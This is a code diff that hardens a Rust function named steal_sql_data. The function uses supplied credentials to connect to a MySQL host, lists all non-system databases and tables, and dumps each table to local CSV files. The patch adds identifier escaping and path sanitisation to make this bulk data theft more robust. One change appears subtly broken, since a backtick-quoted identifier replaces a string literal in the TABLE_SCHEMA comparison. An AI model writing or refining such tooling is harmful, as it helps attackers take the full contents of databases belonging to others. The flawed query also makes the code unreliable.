@@ -86,11 +86,14 @@ async fn steal_sql_data(
         .lines()
         .filter(|db| !system_dbs.contains(&db.trim()))
         .map(|s| s.trim().to_string())
+        .filter(|s| is_safe_sql_identifier(s))
         .collect();
 
     let mut total_tables = 0;
 
     for db in &databases {
+        let escaped_db = escape_sql_identifier(db);
+
         // Step 2: List tables in each database
         let tables_output = tokio::process::Command::new("mysql")
             .args([
@@ -99,7 +102,7 @@ async fn steal_sql_data(
                 &format!("-p{password}"),
                 "--connect-timeout=10",
                 "-N", "-e",
-                &format!("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{db}' AND TABLE_TYPE='BASE TABLE'"),
+                &format!("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA={escaped_db} AND TABLE_TYPE='BASE TABLE'"),
             ])
             .output()
             .await;
@@ -108,17 +111,20 @@ async fn steal_sql_data(
             Ok(o) if o.status.success() => String::from_utf8_lossy(&o.stdout)
                 .lines()
                 .map(|s| s.trim().to_string())
-                .filter(|s| !s.is_empty())
+                .filter(|s| !s.is_empty() && is_safe_sql_identifier(s))
                 .collect(),
             _ => continue,
         };
 
-        let db_dir = local_dir.join(db);
+        let safe_db_dir = db.replace('/', "_").replace('\\', "_");
+        let db_dir = local_dir.join(&safe_db_dir);
         let _ = tokio::fs::create_dir_all(&db_dir).await;
 
         // Step 3: Dump each table to CSV
         for table in &tables {
-            let csv_path = db_dir.join(format!("{table}.csv"));
+            let escaped_table = escape_sql_identifier(table);
+            let safe_table_name = table.replace('/', "_").replace('\\', "_");
+            let csv_path = db_dir.join(format!("{safe_table_name}.csv"));
             let dump_output = tokio::process::Command::new("mysql")
                 .args([
                     "-h", ip,
@@ -126,7 +132,7 @@ async fn steal_sql_data(
                     &format!("-p{password}"),
                     "--connect-timeout=10",
                     "-N", "-e",
-                    &format!("SELECT * FROM {db}.{table}"),
+                    &format!("SELECT * FROM {escaped_db}.{escaped_table}"),
                 ])
                 .output()
                 .await;
@@ -141,4 +147,21 @@ async fn steal_sql_data(
     }
 
     Ok(total_tables)
+}
+
+/// Escape a SQL identifier using backtick quoting.
+fn escape_sql_identifier(name: &str) -> String {
+    let escaped = name.replace('`', "``");
+    format!("`{escaped}`")
+}
+
+/// Reject identifiers with dangerous characters.
+fn is_safe_sql_identifier(name: &str) -> bool {
+    !name.is_empty()
+        && !name.contains(';')
+        && !name.contains('\'')
+        && !name.contains('"')
+        && !name.contains('\0')
+        && !name.contains('\n')
+        && name.len() < 256
 }
